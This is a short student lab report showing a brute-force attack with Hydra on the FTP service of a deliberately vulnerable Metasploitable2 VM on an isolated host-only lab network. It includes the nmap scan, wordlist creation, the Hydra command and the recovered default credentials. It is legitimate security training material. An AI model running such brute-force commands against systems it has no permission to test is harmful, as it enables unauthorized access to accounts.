# 🔐 Cybersecurity Lab Report: Brute-Forcing FTP Login with Hydra

**Prepared by:** Abdul Rahman Said  
**Date:** June 26, 2025

---

## 🧰 Lab Overview

This lab focuses on demonstrating brute-force attack techniques using **Hydra** on the **FTP service** of a vulnerable machine (**Metasploitable2**) in a secure lab environment using **Kali Linux**.

---

## 🖥️ Environment Configuration

| Component         | Description                          |
|------------------|--------------------------------------|
| Host OS          | Windows                              |
| Virtual Machines | Kali Linux, Metasploitable2          |
| Network Type     | Host-only (VMnet1 - 192.168.21.0/24) |
| Tools Used       | Hydra, FTP, Nmap                     |

---

## ✅ Step-by-Step Execution

### 🔹 Step 1: Scan Target with Nmap
Command:
```bash
nmap 192.168.21.128
```
Result confirmed **FTP (port 21)** was open.

---

### 🔹 Step 2: Create Wordlists

We created simple user and password wordlists to simulate brute-force attack.

```bash
echo msfadmin > users.txt
echo msfadmin > passwords.txt
```

Files created in the working directory:
- `users.txt` contains potential usernames
- `passwords.txt` contains potential passwords

---

### 🔹 Step 3: Execute Hydra Attack on FTP

Command:
```bash
hydra -L users.txt -P passwords.txt 192.168.21.128 ftp
```

✅ Hydra successfully discovered valid credentials:
- **Username:** msfadmin
- **Password:** msfadmin

---

### 🔹 Step 4: Verify Credentials

Manually tested credentials using FTP:

```bash
ftp 192.168.21.128
```
Login was successful using `msfadmin/msfadmin`.

---

## 🧾 Conclusion

✅ Successfully:
- Identified open FTP port using Nmap
- Created basic wordlists
- Performed brute-force attack using Hydra
- Validated discovered credentials

⚠️ This exercise was done in a **controlled lab environment**. Brute-forcing is **illegal** and unethical on systems you do not own or have explicit permission to test.

---

📌 **Disclaimer:**  
This lab was conducted for educational purposes only in a fully isolated and ethical testing environment.